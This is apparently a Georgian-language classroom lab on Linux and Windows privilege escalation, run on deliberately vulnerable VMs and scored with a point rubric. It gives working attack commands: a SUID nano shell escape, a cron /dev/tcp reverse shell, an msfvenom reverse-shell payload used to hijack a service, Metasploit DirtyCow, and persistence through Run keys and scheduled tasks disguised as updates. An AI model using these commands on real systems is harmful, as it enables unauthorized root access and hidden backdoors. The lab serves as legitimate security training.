# 🧪 Privilege Escalation - დეტალური ლაბორატორია

## 🎯 ლაბის მიზნები
- Linux SUID exploit-ით root მიღება
- Windows Service Permissions exploit
- Persistence მექანიზმების დაყენება
- ნაბიჯ-ნაბიჯ პრაქტიკული ვარჯიში

---

## 🔧 საჭირო რესურსები

### 💻 Virtual Machines:
- **Kali Linux** (Attacker) - VirtualBox/VMware
- **Ubuntu 18.04** (Linux Target) 
- **Windows 10** (Windows Target)
- **ყველა VM ერთ Network-ში** (NAT ან Host-Only)

### 📦 დამატებითი Tools:
- **linpeas.sh** - Linux enumeration
- **winPEAS.exe** - Windows enumeration
- **netcat** - reverse shells
- **Metasploit** - exploitation framework

---

## 🐧 ლაბი #1: Linux SUID Privilege Escalation

### 🎬 სცენარი:
შენ შეღწეული ხარ Ubuntu სერვერზე `john` მომხმარებლით SSH-ით. მიზანია `root` უფლებების მიღება.

---

### 📋 **STEP 1: გარემოს მომზადება**

#### 🔧 Ubuntu VM Setup (Instructor):
```bash
# Ubuntu VM-ზე SUID ბინარის შექმნა
sudo cp /bin/nano /tmp/vulnerable_nano
sudo chmod 4755 /tmp/vulnerable_nano
sudo chown root:root /tmp/vulnerable_nano

# ტესტ მომხმარებლის შექმნა
sudo useradd -m -s /bin/bash john
echo "john:password123" | sudo chpasswd
```

#### 💡 **სტუდენტისთვის - გაუთავისუფლდი SSH-ით:**
```bash
# Kali Linux-იდან
ssh john@UBUNTU_IP
# Password: password123
```

---

### 📋 **STEP 2: პირველადი დაზვერვა**

#### 🔍 **გარემოს შესწავლა:**
```bash
# ვინ ვარ და სად ვარ?
whoami
# შედეგი: john

id
# შედეგი: uid=1001(john) gid=1001(john) groups=1001(john)

# სისტემის ინფორმაცია
uname -a
# შედეგი: Linux ubuntu 4.15.0-54-generic #58-Ubuntu...

pwd
# შედეგი: /home/john
```

#### 🔐 **პრივილეგიების შემოწმება:**
```bash
# sudo უფლებები
sudo -l
# შედეგი: Sorry, user john may not run sudo on ubuntu

# groups მონაწილეობა
groups
# შედეგი: john
```

💡 **აღწერა:** ჯერჯერობით ჩვეულებრივი მომხმარებლის უფლებები გვაქვს!

---

### 📋 **STEP 3: SUID ბინარების ნადირობა**

#### 🎯 **SUID ფაილების პოვნა:**
```bash
# ყველაზე მნიშვნელოვანი ბრძანება!
find / -perm -4000 -type f 2>/dev/null
```

**📊 მოსალოდნელი შედეგი:**
```
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/bin/mount
/bin/umount
/bin/su
/tmp/vulnerable_nano    ← 🎯 ეს არის ჩვენი target!
```

#### 🔎 **ანალიზი:**
```bash
# დავამოწმოთ vulnerable_nano
ls -la /tmp/vulnerable_nano
# შედეგი: -rwsr-xr-x 1 root root 240613 Dec 25 10:30 /tmp/vulnerable_nano

# s ბითი ნიშნავს SUID!
# root ეკუთვნის და SUID-ია = საშიშია! 🚨
```

---

### 📋 **STEP 4: GTFOBins-ის კონსულტაცია**

#### 🌐 **https://gtfobins.github.io/gtfobins/nano/ ვიზიტი**

**📖 მიღებული ინფორმაცია:**
```bash
# nano SUID exploit:
./nano -T4 /etc/passwd
# შემდეგ nano-ში:
# Ctrl+R (Read File)
# Ctrl+X (Execute Command)
# ჩაწერე: reset; sh 1>&0 2>&0
```

---

### 📋 **STEP 5: Exploitation**

#### 🚀 **SUID nano Exploit:**
```bash
# vulnerable nano-ს გაშვება
/tmp/vulnerable_nano -T4 /etc/passwd
```

#### 🎮 **nano Editor-ში:**
1. **Ctrl+R** (Read File ღილაკი)
2. **Ctrl+X** (Execute Command ღილაკი) 
3. **ჩაწერე:** `reset; sh 1>&0 2>&0`
4. **Enter** დაჭირე

#### 🎉 **შედეგის შემოწმება:**
```bash
# თუ ყველაფერი სწორია, მიიღებ:
# 

whoami
# შედეგი: root 🎯

id
# შედეგი: uid=0(root) gid=0(root) groups=0(root)
```

#### 📸 **Screenshot-ის გადაღება:**
```bash
# მტკიცებულების გადაღება
cat /etc/shadow
# მხოლოდ root-ს შეუძლია წაკითხვა!
```

---

### 📋 **STEP 6: Linux Persistence**

#### 🕒 **Cron Job Backdoor-ის დაყენება:**

```bash
# შენი Kali IP-ის გაგება
# Kali VM-ზე სხვა terminal-ში:
ip addr show
# მაგ: 192.168.56.101
```

```bash
# Ubuntu root shell-იდან:
echo "*/5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1" > /tmp/cron_job

# crontab-ში დამატება
crontab /tmp/cron_job

# დავადასტუროთ
crontab -l
# შედეგი: */5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
```

#### 🎧 **Listener-ის მომზადება:**
```bash
# Kali Linux-ზე ახალ terminal-ში:
nc -lvnp 4444
# და ველოდები 5 წუთს...
```

#### ⏰ **5 წუთის შემდეგ:**
```bash
# nc terminal-ში უნდა დაგენახოს:
Connection received on 192.168.56.102 54321
root@ubuntu:~# whoami
root
```

---

## 🏢 ლაბი #2: Windows Service Privilege Escalation  

### 🎬 სცენარი:
შენ შეღწეული ხარ Windows 10 მანქანაზე `bob` მომხმარებლით. მიზანია `SYSTEM` უფლებების მიღება.

---

### 📋 **STEP 1: Windows VM Setup (Instructor)**

#### 🔧 **Vulnerable Service შექმნა:**
```cmd
# Administrator CMD-ში:
sc create VulnService binpath= "C:\Windows\System32\svchost.exe" start= auto
sc sidtype VulnService unrestricted

# Service permissions-ის შეცვლა
sc sdset VulnService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

#### 👤 **ტესტ მომხმარებელი:**
```cmd
net user bob password123 /add
net localgroup "Users" bob /add
```

---

### 📋 **STEP 2: Initial Access**

#### 🔐 **RDP კავშირი:**
```bash
# Kali Linux-იდან
rdesktop -u bob -p password123 WINDOWS_IP
# ან
xfreerdp /u:bob /p:password123 /v:WINDOWS_IP
```

---

### 📋 **STEP 3: Windows Enumeration**

#### 🔍 **სისტემის ინფორმაცია:**
```cmd
# ვინ ვართ?
whoami
REM შედეგი: desktop-abc123\bob

# პრივილეგიები
whoami /priv

# სისტემის ვერსია
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

#### 📂 **winPEAS.exe გაშვება:**
```cmd
# winPEAS-ის ჩამოტვირთვა (Instructor უზრუნველყოფს)
C:\Tools\winPEAS.exe servicesinfo
```

#### 🎯 **ხელით Services-ების შემოწმება:**
```cmd
# Services permissions შემოწმება
icacls "C:\Program Files"

# Services სია
sc query state= all

# Service კონფიგურაცია
sc qc VulnService
```

---

### 📋 **STEP 4: Service Exploitation**

#### 🛠️ **Malicious Executable შექმნა:**
```bash
# Kali Linux-ზე
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4445 -f exe > evil.exe

# Windows VM-ზე ატვირთვა
python3 -m http.server 8080
# Windows-ზე: http://KALI_IP:8080/evil.exe
```

#### 🎧 **Listener გაშვება:**
```bash
# Kali Linux-ზე
nc -lvnp 4445
```

#### ⚙️ **Service-ის შეცვლა:**
```cmd
# Windows VM-ზე
sc config VulnService binpath= "C:\Tools\evil.exe"

# Service-ის გაშვება
sc start VulnService
```

#### 🎉 **SYSTEM Shell მიღება:**
```bash
# nc listener-ზე:
Connection received on WINDOWS_IP 49157
Microsoft Windows [Version 10.0.18363.1316]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system  🎯
```

---

### 📋 **STEP 5: Windows Persistence**

#### 📝 **Registry Run Key:**
```cmd
# SYSTEM shell-იდან
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Tools\evil.exe" /f

# დავადასტუროთ
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

#### ⏰ **Scheduled Task:**
```cmd
# ყოველ 10 წუთში reverse shell
schtasks /create /tn "SystemUpdate" /tr "C:\Tools\evil.exe" /sc minute /mo 10 /ru SYSTEM
```

---

## 🧪 ლაბი #3: Metasploit Automation

### 📋 **STEP 1: Linux Kernel Exploit**

#### 🔍 **Target Discovery:**
```bash
# Kali Linux-ზე
nmap -sS -sV UBUNTU_IP

# SSH-ით კავშირი john მომხმარებლით
ssh john@UBUNTU_IP
```

#### 📊 **Kernel Version შემოწმება:**
```bash
uname -r
# შედეგი: 4.15.0-54-generic (DirtyCow vulnerable)
```

#### 🚀 **Metasploit Exploit:**
```bash
# Kali Linux-ზე
msfconsole

# Metasploit-ში:
use exploit/linux/local/cve_2016_5195_dirtycow
set SESSION 1  # SSH session number
set LHOST KALI_IP
set LPORT 4446
exploit
```

---

### 📋 **STEP 2: Persistence Module**

#### 🔄 **Metasploit Persistence:**
```bash
# Metasploit-ში (Linux root session-ში)
use post/linux/manage/sshkey_persistence
set SESSION 2  # root session
run

# Windows SYSTEM session-ში
use post/windows/manage/persistence_exe
set SESSION 3  # Windows SYSTEM session
set REXEPATH C:\Tools\persistent.exe
run
```

---

## 📊 ლაბის შედეგების შეჯამება

### ✅ **Linux ნაწილი (20 ქულა):**
- [ ] **SSH წვდომა** john მომხმარებლით (2 ქულა)
- [ ] **SUID ბინარის პოვნა** `/tmp/vulnerable_nano` (3 ქულა)
- [ ] **GTFOBins-ის გამოყენება** (3 ქულა)
- [ ] **Root shell მიღება** `whoami` screenshot (5 ქულა)
- [ ] **Cron persistence** მუშა reverse shell (4 ქულა)
- [ ] **Listener-ზე connection** მიღება (3 ქულა)

### ✅ **Windows ნაწილი (20 ქულა):**
- [ ] **RDP წვდომა** bob მომხმარებლით (2 ქულა)
- [ ] **winPEAS enumeration** გაშვება (3 ქულა)
- [ ] **Service vulnerability** აღმოჩენა (3 ქულა)
- [ ] **Malicious service** შექმნა (4 ქულა)
- [ ] **SYSTEM shell** მიღება (5 ქულა)
- [ ] **Registry persistence** (3 ქულა)

### ✅ **Metasploit ნაწილი (10 ქულა):**
- [ ] **Kernel exploit** გამოყენება (5 ქულა)
- [ ] **Persistence module** გაშვება (5 ქულა)

---

## 🚨 გაფრთხილებები და რჩევები

### ⚠️ **ხშირი შეცდომები:**

#### 🐧 **Linux:**
- **არასწორი IP cron job-ში** - ყოველთვის `ip addr show`
- **nc listener არ მუშაობს** - firewall/port forwarding
- **SUID ბინარი არ ეშვება** - permissions/path პრობლემა

#### 🏢 **Windows:**
- **RDP connection არ მუშაობს** - RDP service გამორთული
- **Service exploit ვერ მუშაობს** - UAC/Windows Defender
- **Payload არ ეშვება** - Antivirus ბლოკავს

### 💡 **Tips & Tricks:**

#### 🔧 **Debug ბრძანებები:**
```bash
# Linux
systemctl status cron  # cron service მუშაობს?
tail -f /var/log/cron   # cron ლოგები

# Windows  
sc query VulnService    # service status
eventvwr.msc           # Windows Event Logs
```

#### 🛡️ **Cleanup:**
```bash
# Linux
crontab -r              # persistence წაშლა

# Windows
sc delete VulnService   # service წაშლა
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
```

---

## 📝 შეჯამება და რეპორტი

### 📋 **სტუდენტმა უნდა ჩააბაროს:**

1. **📸 Screenshots** ყველა მნიშვნელოვანი ნაბიჯისთვის
2. **📝 Command History** (`history` ბრძანება)
3. **🔍 Vulnerability Assessment** - რა იპოვა და როგორ
4. **🛡️ Mitigation Steps** - როგორ უნდა ამოღებულიყო დაუცველობა
5. **📊 Summary Report** - რას ისწავლა

### 🎯 **საბოლოო მიზანი:**
სტუდენტმა უნდა ნათლად გაიგოს Privilege Escalation-ის პროცესი და შეძლოს მისი გამეორება რეალურ გარემოში!
